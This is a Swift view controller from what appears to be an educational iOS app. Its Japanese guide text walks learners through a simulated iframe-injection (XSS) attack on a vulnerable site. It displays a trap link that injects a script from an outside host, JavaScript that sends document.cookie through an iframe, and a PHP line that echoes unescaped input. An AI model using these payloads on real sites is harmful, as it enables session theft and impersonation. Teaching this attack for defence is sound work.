import UIKit

class IFrameInjectionUnsafeWebSimulatorViewController: WebSimulatorViewController {
    
    let trapButton = A()
    let welcomeLabel = H1()
    let nameLabel = P()
    let feedbackIFrame = IFrame()
    let attackedLabel = Text()
    let sessIdLabel = Text()
    let feedbackView = WebSimulatorView()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        setupViews()
    }
    
    override func viewDidAppear(_ animated: Bool) {
        super.viewDidAppear(animated)
        showTrap()
    }
    
    private func setupViews() {
        trapButton.set(text: "このサイト本当に面白い!!")
        trapButton.set(
            code: "<a href=\"http://www.unsafe.co.jp/welcome.php?name=<script src=http://www.trap.cp.jp/iframe_injection.js></script>\">\n    このサイト本当に面白い!!\n</a>",
            language: .html
        )
        trapButton.addGestureRecognizer(UITapGestureRecognizer(target: self, action: #selector(showTrapButtonDisabledMessage(_:))))
        welcomeLabel.text = "ようこそ脆弱株式会社へ"
        nameLabel.text = "さん"
        nameLabel.set(
            code: "<script src=\"http://www.trap.cp.jp/iframe_injection.js\"></script>さん",
            language: .html
        )
        feedbackIFrame.frame.size = CGSize(width: 320, height: 320)
        feedbackIFrame.set(
            code: "var iframe = document.createElement(\"iframe\");\niframe.width = 320\niframe.height = 320\niframe.setAttribute(\"src\", \"send_mail.php?cookie=\" + document.cookie);\ndocument.body.appendChild(iframe);",
            language: .javaScript
        )
        feedbackIFrame.codeLabel.positionX = .right
        feedbackIFrame.codeLabel.positionY = .top
        attackedLabel.text = "攻撃成功"
        sessIdLabel.text = "PHPSESSID=c4ad79dc6067469927e00e1adc847c78"
        feedbackIFrame.webSimulatorView = feedbackView
    }
    
    private func showTrap() {
        webSimulatorView.clear()
        webSimulatorView.appendElement(trapButton)
        startGuide1()
    }
    
    private func showWelcome() {
        webSimulatorView.clear()
        webSimulatorView.appendElement(welcomeLabel)
        webSimulatorView.appendElement(nameLabel)
        webSimulatorView.appendElement(feedbackIFrame)
        feedbackView.appendElement(attackedLabel)
        feedbackView.appendBreak()
        feedbackView.appendElement(sessIdLabel)
        startGuide2()
    }
    
    private func startGuide1() {
        endGuideHandler = guide1_1
        appendGuideText("これが攻撃者が用意した罠サイトです。", programingLanguages: nil)
        setGuideText()
        showGuideTextView(completion: nil)
    }
    
    private func guide1_1() {
        endGuideHandler = guide1_2
    appendGuideText("この赤枠で囲まれたリンクをタップすると脆弱なWebサイトに遷移します。\nリンクの下に表示されたコードを見てみましょう。", programingLanguages: nil)
        appendGuideText("脆弱なWebサイトに遷移する際、GETリクエストのnameパラメータには<script src=http://www.trap.cp.jp/iframe_injection.js></script>が設定されています。", programingLanguages: .html)
        appendGuideText("このnameの値をエスケープせずに直接表示することによって攻撃者のスクリプトが実行されます。", programingLanguages: nil)
        appendGuideText("それでは実際にこのリンクをタップして脆弱なWebサイトに遷移してみましょう。", programingLanguages: nil)
        setGuideText()
        focus(on: trapButton)
    }
    
    private func guide1_2() {
        hideGuideTextView() {
            self.trapButton.gestureRecognizers?.forEach { self.trapButton.removeGestureRecognizer($0) }
            self.trapButton.addGestureRecognizer(UITapGestureRecognizer(target: self, action: #selector(self.handleTrapButtonToShowWelcome(_:))))
            self.unfocus(elementView: self.trapButton)
        }
    }
    
    private func startGuide2() {
        endGuideHandler = guide2_1
        appendGuideText("これが実際にスクリプトが埋め込まれた後の脆弱なWebサイトです。", programingLanguages: nil)
        setGuideText()
        showGuideTextView(completion: nil)
    }
    
    private func guide2_1() {
        endGuideHandler = guide2_2
        appendGuideText("この赤枠で囲まれた<p>タグには本来以下のコードでユーザの名前を表示しようとしていました。\n<p><?php echo $_GET[\"name\"]; ?>さん</p>\nしかし、実際には<p>タグの下に示したコードが実行されました。", programingLanguages: .html, .php)
        appendGuideText("nameに設定された値をエスケープせずに表示した結果、\n「<p><?php echo <script src=http://www.trap.cp.jp/iframe_injection.js></script>; ?>さん</p>」というコードが実行され攻撃者の用意したスクリプトが読み込まれてしまいました。", programingLanguages: .php, .html)
        setGuideText()
        focus(on: nameLabel)
    }
    
    private func guide2_2() {
        endGuideHandler = guide2_3
    appendGuideText("この赤枠で囲まれた部分が攻撃者が埋め込んだ<iframe>要素です。\n今回は分かりやすさを狙って<iframe>要素を表示していますが、実際には攻撃者は自身が埋め込んだ<iframe>要素を表示せずに隠蔽します。", programingLanguages: .html)
        setGuideText()
        unfocus(elementView: nameLabel)
        focus(on: feedbackIFrame)
    }
    
    private func guide2_3() {
        endGuideHandler = guide2_4
    appendGuideText("ここに攻撃者が取得したユーザのクッキーの値が表示されています。\n脆弱なWebサイトで生成したユーザのセッションIDが盗まれてしまっています。", programingLanguages: nil)
    appendGuideText("セッションIDが盗まれると攻撃者がユーザになりすますことが可能となってしまいます。\nユーザになりすましてサービスを利用されてしまってはユーザが不利益を被ることになりますし、サービスへの信頼も失ってしまいます。", programingLanguages: nil)
        appendGuideText("他にもCookieからユーザの様々な個人情報が盗まれてしまうため、早急に対策する必要があります。", programingLanguages: nil)
        setGuideText()
        unfocus(elementView: feedbackIFrame)
        focus(on: sessIdLabel)
    }
    
    private func guide2_4() {
        endGuideHandler = guide2_5
    appendGuideText("今回のレッスンはこれで終了です。\nこの攻撃への対策は同レッスンの対策編で解説していますのでそちらを参考にしてください。\nお疲れ様でした。", programingLanguages: nil)
        setGuideText()
        unfocus(elementView: sessIdLabel)
    }
    
    private func guide2_5() {
        hideGuideTextView() {
            self.presentingViewController?.presentingViewController?.dismiss(animated: true, completion: nil)
        }
    }
    
    
    @objc
    private func showTrapButtonDisabledMessage(_ sender: UIButton) {
        NotificationMessage.send(text: "全ての説明文を読むまでは次の画面に遷移できません。", axisX: .right, axisY: .center, size: nil, font: .boldSystemFont(ofSize: 18), textColor: .white, backgroundColor: .red, lifeSeconds: 2)
    }
    
    @objc
    private func handleTrapButtonToShowWelcome(_ sender: UIButton) {
        showWelcome()
    }
    
}
